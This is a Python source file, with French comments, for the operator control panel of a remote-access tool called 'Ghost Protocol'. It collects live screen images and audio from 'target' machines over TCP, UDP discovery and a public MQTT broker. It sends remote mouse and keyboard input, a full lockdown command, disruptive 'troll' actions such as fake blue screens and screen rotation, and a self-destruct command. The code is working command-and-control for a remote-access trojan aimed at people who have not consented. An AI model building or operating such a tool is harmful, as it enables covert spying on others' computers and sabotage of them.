# -*- coding: utf-8 -*-
"""
================================================================================
                    DEEPMIND GHOST PROTOCOL - OPERATOR VIEWER (HTML)
================================================================================
Auteur      : Expert Python Senior & Antigravity AI
Objectif    : Réception, sélection et affichage en temps réel de multiples cibles
              via une interface HTML5/CSS3 glassmorphique embarquée dans PyWebView.
================================================================================
"""

import os
import sys
import socket
import threading
import json
import base64
import time
import webview
import ctypes
from ctypes import wintypes
import queue

# Définitions de Hook Win32 pour le Viewer
WH_KEYBOARD_LL = 13

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wintypes.WPARAM, ctypes.POINTER(KBDLLHOOKSTRUCT))

# Prototypes des fonctions Win32
ctypes.windll.user32.SetWindowsHookExW.restype = ctypes.c_void_p
ctypes.windll.user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong]
ctypes.windll.user32.CallNextHookEx.restype = ctypes.c_longlong
ctypes.windll.user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, ctypes.c_void_p]
ctypes.windll.user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]

# Importer l'interface HTML embarquée
from ghost_html import HTML_CONTENT

# Configuration par défaut
DEFAULT_PORT = 9999

# Configuration Cloud MQTT (pour connexion inter-réseaux automatique)
MQTT_BROKER = "broker.hivemq.com"
MQTT_PORT = 1883
MQTT_TOPIC = "ghost_protocol/stream/zakri"


class JSBridge:
    """
    Pont de communication exposé au JavaScript.
    Toutes les méthodes de cette classe sont appelables en JS via `window.pywebview.api.nomMethode(arguments)`.
    """
    def __init__(self, app):
        self._app = app

    def selectTarget(self, target_id):
        self._app.selected_target_id = target_id
        self._app.log_message(f"[*] Cible sélectionnée dans l'UI : {target_id}", "info")
        # Renvoyer instantanément la dernière image en cache si elle existe
        target = self._app.active_targets.get(target_id)
        if target and target.get("last_image"):
            self._app.render_image(target_id, target["last_image"])

    def deselectTarget(self):
        self._app.deselect_target()
        self._app.log_message("[*] Cible désélectionnée dans l'UI.", "info")

    def sendTrollMessage(self, target_id, text):
        self._app.send_troll_message(target_id, text)

    def startProtocol(self, target_id):
        self._app.send_start_protocol_command(target_id)

    def stopProtocol(self, target_id):
        self._app.send_stop_protocol_command(target_id)

    def stopStream(self, target_id):
        self._app.send_stop_stream_command(target_id)

    def killClient(self, target_id):
        self._app.send_kill_client_command(target_id)

    def toggleTroll(self, target_id, name, state, extra=None):
        self._app.toggle_troll_cmd(target_id, name, state, extra)

    def updateStreamSettings(self, target_id, fps, quality):
        self._app.send_stream_settings(target_id, fps, quality)

    def toggleRemoteControl(self, target_id, active):
        self._app.toggle_remote_control(target_id, active)

    def sendRemoteMouseMove(self, target_id, rx, ry):
        self._app.send_remote_mouse_move(target_id, rx, ry)

    def sendRemoteMouseClick(self, target_id, button, state):
        self._app.send_remote_mouse_click(target_id, button, state)

    def sendRemoteKey(self, target_id, vk, state):
        self._app.send_remote_key(target_id, vk, state)


class GhostViewerApp:
    def __init__(self):
        self.window = None
        self.server_socket = None
        self.listen_thread = None
        self.udp_socket = None
        self.mqtt_client = None
        self.is_running = True
        
        # Structure de données multi-cibles
        # Clé : target_id (ex: host_username_or_ip)
        # Valeur : dict(conn=socket, info=dict, last_image=bytes, client_type='TCP'|'MQTT')
        self.active_targets = {}
        self.selected_target_id = None
        
        # Initialisation du hook et de la file d'attente clavier
        self.viewer_keyboard_hook = None
        self.viewer_keyboard_hook_proc_ref = None
        self.key_event_queue = queue.Queue()
        self.key_worker_thread = threading.Thread(target=self.key_dispatcher_worker, daemon=True)
        self.key_worker_thread.start()

    def key_dispatcher_worker(self):
        while self.is_running:
            try:
                # Bloque avec un timeout de 1s pour vérifier périodiquement self.is_running
                item = self.key_event_queue.get(timeout=1.0)
                target_id, vk, state = item
                self.send_remote_key(target_id, vk, state)
                self.key_event_queue.task_done()
            except queue.Empty:
                continue
            except Exception:
                pass

    def viewer_keyboard_hook_callback(self, nCode, wParam, lParam):
        try:
            if nCode >= 0 and lParam:
                fore_hwnd = ctypes.windll.user32.GetForegroundWindow()
                lpdw_process_id = ctypes.c_ulong()
                ctypes.windll.user32.GetWindowThreadProcessId(fore_hwnd, ctypes.byref(lpdw_process_id))
                
                if lpdw_process_id.value == os.getpid():
                    kbd = lParam.contents
                    vk = kbd.vkCode
                    
                    # Permettre à Échap (0x1B) de passer pour quitter le plein écran
                    if vk == 0x1B:
                        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                    
                    is_down = wParam in (0x0100, 0x0104) # WM_KEYDOWN, WM_SYSKEYDOWN
                    state = "down" if is_down else "up"
                    
                    if self.selected_target_id:
                        self.key_event_queue.put((self.selected_target_id, vk, state))
                    
                    return 1 # Bloquer la touche localement pour Windows
        except Exception:
            pass
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

    def install_viewer_hook(self):
        if not self.viewer_keyboard_hook:
            self.viewer_keyboard_hook_proc_ref = HOOKPROC(self.viewer_keyboard_hook_callback)
            self.viewer_keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
                WH_KEYBOARD_LL,
                self.viewer_keyboard_hook_proc_ref,
                ctypes.windll.kernel32.GetModuleHandleW(None),
                0
            )

    def uninstall_viewer_hook(self):
        if self.viewer_keyboard_hook:
            ctypes.windll.user32.UnhookWindowsHookEx(self.viewer_keyboard_hook)
            self.viewer_keyboard_hook = None
            self.viewer_keyboard_hook_proc_ref = None

    def run_js(self, js_code):
        """Exécute de manière sécurisée du code JavaScript dans le moteur WebView."""
        if self.window:
            try:
                self.window.evaluate_js(js_code)
            except Exception:
                pass

    def log_message(self, message, type_="info"):
        """Affiche le log en console locale et le pousse vers l'UI HTML."""
        t = time.strftime("[%H:%M:%S]")
        print(f"{t} [{type_.upper()}] {message}")
        
        # Échapper les caractères spéciaux pour JS
        escaped_msg = message.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "")
        self.run_js(f"window.addLog('{escaped_msg}', '{type_}')")

    def update_ui_list(self):
        """Transmet la liste actuelle des cibles à l'interface HTML."""
        ui_targets = {}
        for tid, target in self.active_targets.items():
            ui_targets[tid] = {
                "info": {
                    "hostname": target["info"].get("hostname", "Inconnu"),
                    "username": target["info"].get("username", "Inconnu"),
                    "os": target["info"].get("os", "Inconnu"),
                    "ip": target["info"].get("ip", "Inconnu")
                },
                "trolls": target.get("trolls", {})
            }
        targets_json = json.dumps(ui_targets)
        escaped_json = targets_json.replace("\\", "\\\\").replace("'", "\\'")
        self.run_js(f"window.updateTargetsList('{escaped_json}')")

    def deselect_target(self):
        """Réinitialise la cible active et nettoie l'interface."""
        self.selected_target_id = None
        self.run_js("if (typeof deselectTarget === 'function') deselectTarget();")

    def watchdog_loop(self):
        """Vérifie en continu l'activité des cibles MQTT et purge celles qui sont arrêtées."""
        while self.is_running:
            time.sleep(1.0)
            now = time.time()
            to_remove = []
            for tid, target in list(self.active_targets.items()):
                if target.get("client_type") == "MQTT":
                    last_seen = target.get("last_seen", now)
                    if now - last_seen > 4.0:
                        to_remove.append(tid)
            for tid in to_remove:
                if tid in self.active_targets:
                    self.log_message(f"[-] Cible Cloud '{tid}' déconnectée (inactivité)", "warning")
                    del self.active_targets[tid]
                    if self.selected_target_id == tid:
                        self.deselect_target()
                    self.update_ui_list()

    def render_image(self, target_id, img_bytes):
        """Encode l'image JPEG en Base64 et l'envoie à l'UI pour rendu."""
        try:
            b64_str = base64.b64encode(img_bytes).decode('utf-8')
            self.run_js(f"window.updateScreenshot('{target_id}', '{b64_str}')")
        except Exception as e:
            pass

    def start_servers(self):
        """Initialise le serveur TCP local, la découverte UDP et le client MQTT Cloud."""
        self.is_running = True
        self.log_message(f"Démarrage du serveur d'écoute sur le port {DEFAULT_PORT}...", "info")
        
        # 1. Démarrage du serveur TCP d'écoute local
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(("0.0.0.0", DEFAULT_PORT))
            self.server_socket.listen(5)
            
            self.listen_thread = threading.Thread(target=self.accept_connections, daemon=True)
            self.listen_thread.start()
            self.log_message(f"[+] Serveur TCP actif sur le port {DEFAULT_PORT}.", "cmd")
        except Exception as e:
            self.log_message(f"[!] Échec du démarrage du serveur TCP : {e}", "alert")

        # 2. Démarrage du service de découverte automatique UDP sur le port 9998
        try:
            self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.udp_socket.bind(("", 9998))
            threading.Thread(target=self.discovery_udp_loop, daemon=True).start()
            self.log_message("[+] Service de découverte UDP actif sur le port 9998.", "cmd")
        except Exception as ue:
            self.log_message(f"[!] Échec du démarrage UDP : {ue}", "alert")

        # 3. Démarrage du client MQTT Cloud (broker.hivemq.com)
        try:
            import paho.mqtt.client as mqtt
            self.mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            try:
                self.mqtt_client.max_queued_messages_set(3)
            except Exception:
                pass
            self.mqtt_client.on_connect = self.on_mqtt_connect
            self.mqtt_client.on_message = self.on_mqtt_message
            self.mqtt_client.connect(MQTT_BROKER, MQTT_PORT, 60)
            self.mqtt_client.loop_start()
            self.log_message(f"[+] Client Cloud MQTT connecté au topic : {MQTT_TOPIC}/#", "cmd")
            threading.Thread(target=self.watchdog_loop, daemon=True).start()
        except Exception as me:
            self.log_message(f"[!] Échec de la connexion MQTT Cloud : {me}", "alert")

    def stop_servers(self):
        """Ferme proprement toutes les connexions réseau en arrière-plan."""
        self.is_running = False
        self.uninstall_viewer_hook()
        
        # Fermer toutes les sockets client TCP actives
        for target in list(self.active_targets.values()):
            if target.get("conn"):
                try:
                    target["conn"].close()
                except Exception:
                    pass
        self.active_targets.clear()
        
        # Fermer la socket du serveur TCP
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
            self.server_socket = None
            
        # Fermer la socket UDP
        if self.udp_socket:
            try:
                self.udp_socket.close()
            except Exception:
                pass
            self.udp_socket = None
            
        # Arrêter le loop et déconnecter MQTT
        if self.mqtt_client:
            try:
                self.mqtt_client.loop_stop()
                self.mqtt_client.disconnect()
            except Exception:
                pass
            self.mqtt_client = None

    def accept_connections(self):
        """Accepte les connexions TCP entrantes des machines cibles locales."""
        local_ips = {"127.0.0.1", "localhost", "0.0.0.0", "::1"}
        try:
            local_ips.add(socket.gethostbyname(socket.gethostname()))
            for item in socket.getaddrinfo(socket.gethostname(), None):
                local_ips.add(item[4][0])
        except Exception:
            pass

        while self.is_running:
            try:
                conn, addr = self.server_socket.accept()
                if not self.is_running:
                    break
                
                # Ignorer les connexions locales de notre propre machine
                if addr[0] in local_ips:
                    conn.close()
                    continue
                
                threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()
            except Exception:
                break

    def handle_client(self, conn):
        """Reçoit les métadonnées initiales et le flux vidéo en direct d'un client local."""
        target_id = None
        try:
            # 1. Lire le JSON de description de la machine
            header_len_bytes = self.recv_all(conn, 4)
            if not header_len_bytes:
                raise Exception("Déconnexion lors de la lecture de la taille.")
                
            header_len = int.from_bytes(header_len_bytes, byteorder='big')
            header_json_bytes = self.recv_all(conn, header_len)
            if not header_json_bytes:
                raise Exception("Déconnexion lors du JSON.")
                
            client_info = json.loads(header_json_bytes.decode('utf-8'))
            client_id = f"{client_info.get('hostname', 'unknown').lower()}_{client_info.get('username', 'unknown').lower()}".replace(" ", "_")
            target_id = client_id
            
            self.log_message(f"[+] Cible identifiée via TCP : {client_info.get('hostname')} ({client_info.get('username')})", "cmd")
            
            # Enregistrer la cible
            self.active_targets[target_id] = {
                "conn": conn,
                "info": client_info,
                "last_image": None,
                "client_type": "TCP",
                "trolls": {
                    "drift": False,
                    "drunk_mouse": False,
                    "invisible_wall": False,
                    "pixels": False,
                    "prank_keys": False,
                    "ghost_sounds": False,
                    "system_tts": False,
                    "screen_rotate": False,
                    "elusive_window": False,
                    "monkey_volume": False,
                    "bsod": False
                }
            }
            self.update_ui_list()
            
            # 2. Recevoir le flux vidéo ou les métadonnées
            while self.is_running:
                type_bytes = self.recv_all(conn, 4)
                if not type_bytes:
                    break
                pkt_type = int.from_bytes(type_bytes, byteorder='big')
                
                size_bytes = self.recv_all(conn, 4)
                if not size_bytes:
                    break
                size = int.from_bytes(size_bytes, byteorder='big')
                
                data = self.recv_all(conn, size)
                if not data:
                    break
                    
                if pkt_type == 0:
                    self.active_targets[target_id]["last_image"] = data
                    # Envoyer à l'UI si cette cible est sélectionnée
                    if self.selected_target_id == target_id:
                        self.render_image(target_id, data)
                elif pkt_type == 3:
                    # Chunks audio du client local
                    if self.selected_target_id == target_id:
                        try:
                            b64_audio = base64.b64encode(data).decode('utf-8')
                            self.run_js(f"if (typeof window.playAudioChunk === 'function') window.playAudioChunk('{b64_audio}');")
                        except Exception:
                            pass
                elif pkt_type == 1:
                    try:
                        metadata = json.loads(data.decode('utf-8'))
                        if "windows" in metadata:
                            self.active_targets[target_id]["info"]["windows"] = metadata["windows"]
                            self.update_ui_list()
                    except Exception:
                        pass
                elif pkt_type == 2:
                    try:
                        status_data = json.loads(data.decode('utf-8'))
                        if "remote_control" in status_data:
                            remote_active = status_data["remote_control"]
                            if not remote_active:
                                self.uninstall_viewer_hook()
                            else:
                                self.install_viewer_hook()
                            if self.selected_target_id == target_id:
                                self.run_js(f"if (typeof window.setRemoteControlState === 'function') window.setRemoteControlState({str(remote_active).lower()});")
                    except Exception:
                        pass
                    
        except Exception as e:
            if target_id:
                self.log_message(f"[!] Erreur cible '{target_id}' : {e}", "alert")
        finally:
            if target_id in self.active_targets:
                self.log_message(f"[-] Déconnexion de la cible '{target_id}'", "warning")
                del self.active_targets[target_id]
                self.update_ui_list()
            try:
                conn.close()
            except Exception:
                pass

    def recv_all(self, conn, length):
        """Lit précisément 'length' octets depuis le socket TCP."""
        data = bytearray()
        while len(data) < length:
            packet = conn.recv(length - len(data))
            if not packet:
                return None
            data.extend(packet)
        return data

    def discovery_udp_loop(self):
        """Répond aux paquets UDP broadcast des clients pour leur indiquer le port d'écoute."""
        local_ips = {"127.0.0.1", "localhost", "0.0.0.0", "::1"}
        try:
            local_ips.add(socket.gethostbyname(socket.gethostname()))
            for item in socket.getaddrinfo(socket.gethostname(), None):
                local_ips.add(item[4][0])
        except Exception:
            pass

        while self.is_running and self.udp_socket:
            try:
                data, addr = self.udp_socket.recvfrom(1024)
                if addr[0] in local_ips:
                    continue
                    
                if data == b"GHOST_PROTOCOL_CLIENT_DISCOVER":
                    reply = f"GHOST_PROTOCOL_VIEWER_HERE:{DEFAULT_PORT}".encode('utf-8')
                    self.udp_socket.sendto(reply, addr)
            except Exception:
                break

    def on_mqtt_connect(self, client, userdata, flags, rc, properties=None):
        """Abonnement aux canaux d'informations et d'images MQTT."""
        client.subscribe(MQTT_TOPIC + "/info")
        client.subscribe(MQTT_TOPIC + "/#")
        try:
            client.publish(MQTT_TOPIC + "/request_info", b"1", qos=0)
        except Exception:
            pass

    def on_mqtt_message(self, client, userdata, msg):
        """Réception et traitement des données reçues du Cloud MQTT."""
        if not self.is_running:
            return
            
        my_hostname = socket.gethostname().lower()
        
        # 1. Réception des métadonnées d'une machine
        if msg.topic == MQTT_TOPIC + "/info" or msg.topic.endswith("/info"):
            try:
                if not msg.payload:
                    return
                client_info = json.loads(msg.payload.decode('utf-8'))
                client_hostname = client_info.get("hostname", "").lower()
                
                # Ignorer notre propre machine
                if client_hostname == my_hostname:
                    return
                    
                target_id = client_info.get("client_topic", "").split("/")[-1]
                if not target_id:
                    target_id = f"{client_info.get('hostname', 'unknown').lower()}_{client_info.get('username', 'unknown').lower()}".replace(" ", "_")
                
                # Ignorer si vieux timestamp (> 8s)
                ts = client_info.get("timestamp")
                if ts and (time.time() - ts > 8.0):
                    return

                if target_id not in self.active_targets:
                    self.active_targets[target_id] = {
                        "conn": None,
                        "info": client_info,
                        "last_image": None,
                        "last_seen": time.time(),
                        "client_type": "MQTT",
                        "trolls": {
                            "drift": False,
                            "drunk_mouse": False,
                            "invisible_wall": False,
                            "pixels": False,
                            "prank_keys": False,
                            "ghost_sounds": False,
                            "system_tts": False,
                            "screen_rotate": False,
                            "elusive_window": False,
                            "monkey_volume": False,
                            "bsod": False
                        }
                    }
                    self.log_message(f"[+] Nouvelle cible détectée via CLOUD : {client_info.get('hostname')}", "cmd")
                    self.update_ui_list()
                else:
                    self.active_targets[target_id]["info"] = client_info
                    self.active_targets[target_id]["last_seen"] = time.time()
                    self.update_ui_list()
            except Exception:
                pass
                
        # 2. Réception des captures d'écran du flux vidéo Cloud
        elif msg.topic.startswith(MQTT_TOPIC + "/"):
            parts = msg.topic.split("/")
            if len(parts) == 4 and parts[3] not in ("cmd", "info", "request_info"):
                target_id = parts[3]
                if target_id in self.active_targets:
                    self.active_targets[target_id]["last_image"] = msg.payload
                    self.active_targets[target_id]["last_seen"] = time.time()
                    if self.selected_target_id == target_id:
                        self.render_image(target_id, msg.payload)
                else:
                    self.active_targets[target_id] = {
                        "conn": None,
                        "info": {"hostname": target_id, "username": "Stream Direct", "os": "Windows", "ip": "Cloud"},
                        "last_image": msg.payload,
                        "last_seen": time.time(),
                        "client_type": "MQTT",
                        "trolls": {}
                    }
                    self.update_ui_list()
                    if self.selected_target_id == target_id:
                        self.render_image(target_id, msg.payload)
            elif len(parts) == 5 and parts[4] == "audio":
                target_id = parts[3]
                if target_id in self.active_targets:
                    self.active_targets[target_id]["last_seen"] = time.time()
                if self.selected_target_id == target_id:
                    try:
                        b64_audio = base64.b64encode(msg.payload).decode('utf-8')
                        self.run_js(f"if (typeof window.playAudioChunk === 'function') window.playAudioChunk('{b64_audio}');")
                    except Exception:
                        pass
            elif len(parts) == 5 and parts[4] == "status":
                target_id = parts[3]
                try:
                    status_data = json.loads(msg.payload.decode('utf-8'))
                    if status_data.get("status") == "offline":
                        if target_id in self.active_targets:
                            self.log_message(f"[-] Cible '{target_id}' arrêtée (offline)", "warning")
                            del self.active_targets[target_id]
                            if self.selected_target_id == target_id:
                                self.deselect_target()
                            self.update_ui_list()
                        return
                    if target_id in self.active_targets:
                        self.active_targets[target_id]["last_seen"] = time.time()
                    if "remote_control" in status_data:
                        remote_active = status_data["remote_control"]
                        if not remote_active:
                            self.uninstall_viewer_hook()
                        else:
                            self.install_viewer_hook()
                        if self.selected_target_id == target_id:
                            self.run_js(f"if (typeof window.setRemoteControlState === 'function') window.setRemoteControlState({str(remote_active).lower()});")
                except Exception:
                    pass

    def send_command_to_target(self, target_id, payload_dict):
        """Envoie une commande JSON au client ciblé (soit via TCP local, soit via MQTT Cloud)."""
        target = self.active_targets.get(target_id)
        if not target:
            self.log_message(f"[!] Cible '{target_id}' introuvable.", "alert")
            return
            
        payload = json.dumps(payload_dict).encode('utf-8')
        
        # Envoi en TCP local
        if target["client_type"] == "TCP" and target["conn"]:
            try:
                target["conn"].sendall(len(payload).to_bytes(4, byteorder='big') + payload)
            except Exception as e:
                self.log_message(f"[!] Échec de l'envoi local (TCP) : {e}", "alert")
        
        # Envoi via MQTT Cloud
        elif target["client_type"] == "MQTT":
            try:
                if self.mqtt_client:
                    cmd_topic = f"{MQTT_TOPIC}/{target_id}/cmd"
                    self.mqtt_client.publish(cmd_topic, payload, qos=1)
            except Exception as e:
                self.log_message(f"[!] Échec de l'envoi Cloud : {e}", "alert")

    def toggle_troll_cmd(self, target_id, name, state, extra=None):
        """Active ou désactive un troll spécifique sur la machine cible."""
        target = self.active_targets.get(target_id)
        if not target:
            return
        target["trolls"][name] = state
        
        payload = {
            "action": f"toggle_{name}",
            "active": state
        }
        if extra is not None:
            payload["extra"] = extra
            
        self.send_command_to_target(target_id, payload)
        state_str = "ACTIVÉ" if state else "DÉSACTIVÉ"
        extra_str = f" ({extra})" if extra else ""
        self.log_message(f"[*] Commande toggle_{name}{extra_str} ({state_str}) envoyée à '{target_id}'", "cmd")

    def send_troll_message(self, target_id, text):
        """Envoie un message texte à afficher sur l'écran cible."""
        payload = {"action": "troll_msg", "text": text}
        self.send_command_to_target(target_id, payload)
        self.log_message(f"[+] Message envoyé à '{target_id}' : '{text}'", "cmd")

    def send_start_protocol_command(self, target_id):
        """Démarre le protocole de confinement/verrouillage."""
        payload = {"action": "start_protocol"}
        self.send_command_to_target(target_id, payload)
        self.log_message(f"[!] Lancement du protocole envoyé à '{target_id}' (verrouillage complet).", "warning")

    def send_stop_protocol_command(self, target_id):
        """Arrête le protocole et remet le système cible à l'état normal."""
        payload = {"action": "stop_protocol"}
        target = self.active_targets.get(target_id)
        if target:
            for k in target["trolls"]:
                target["trolls"][k] = False
        self.send_command_to_target(target_id, payload)
        self.log_message(f"[!] Arrêt du protocole envoyé à '{target_id}' (retour normal).", "warning")
        self.update_ui_list()

    def send_stop_stream_command(self, target_id):
        """Arrête la capture vidéo et audio sur la machine cible pour libérer ses ressources."""
        payload = {"action": "stop_stream"}
        self.send_command_to_target(target_id, payload)
        self.log_message(f"[*] Commande d'arrêt du flux d'écran envoyée à '{target_id}'", "info")

    def send_kill_client_command(self, target_id):
        """Ordonne l'autodestruction et le nettoyage immédiat de ghost_script sur la cible."""
        payload = {"action": "kill_client"}
        self.send_command_to_target(target_id, payload)
        self.log_message(f"[!] Commande d'arrêt définitif (kill_client) envoyée à '{target_id}'", "warning")
        if target_id in self.active_targets:
            del self.active_targets[target_id]
            self.update_ui_list()

    def send_stream_settings(self, target_id, fps, quality):
        """Met à jour le FPS et la qualité de la capture vidéo de la cible."""
        payload = {"action": "update_stream_settings", "fps": fps, "quality": quality}
        self.send_command_to_target(target_id, payload)
        self.log_message(f"[*] Réglages envoyés à '{target_id}' : FPS={fps}, Qualité={quality}%", "info")

    def toggle_remote_control(self, target_id, active):
        """Active ou désactive le mode contrôle à distance sur la machine cible."""
        payload = {"action": "toggle_remote_control", "active": active}
        self.send_command_to_target(target_id, payload)
        status_str = "ACTIVÉ" if active else "DÉSACTIVÉ"
        self.log_message(f"[*] Contrôle à distance {status_str} pour '{target_id}'", "cmd")
        
        if active:
            self.install_viewer_hook()
        else:
            self.uninstall_viewer_hook()

    def send_remote_mouse_move(self, target_id, rx, ry):
        """Envoie les coordonnées relatives (0.0 à 1.0) du mouvement de souris."""
        payload = {"action": "remote_input", "type": "mouse_move", "x": rx, "y": ry}
        self.send_command_to_target(target_id, payload)

    def send_remote_mouse_click(self, target_id, button, state):
        """Envoie les informations de clic de souris (button: left/right/middle, state: down/up)."""
        payload = {"action": "remote_input", "type": "mouse_click", "button": button, "state": state}
        self.send_command_to_target(target_id, payload)

    def send_remote_key(self, target_id, vk, state):
        """Envoie les touches claviers (vk: virtual key code, state: down/up)."""
        payload = {"action": "remote_input", "type": "key", "vk": vk, "state": state}
        self.send_command_to_target(target_id, payload)


if __name__ == "__main__":
    app = GhostViewerApp()
    bridge = JSBridge(app)
    
    # Démarrer les sockets d'écoute et les clients MQTT en arrière-plan
    app.start_servers()
    
    # Créer et configurer la fenêtre PyWebView
    window = webview.create_window(
        title="GHOST PROTOCOL — OPERATOR CONTROL PANEL",
        html=HTML_CONTENT,
        js_api=bridge,
        width=1350,
        height=820,
        resizable=True
    )
    app.window = window
    
    def on_closed():
        app.stop_servers()
        os._exit(0)
        
    window.events.closed += on_closed
    
    # Lancement de la boucle PyWebView
    webview.start()
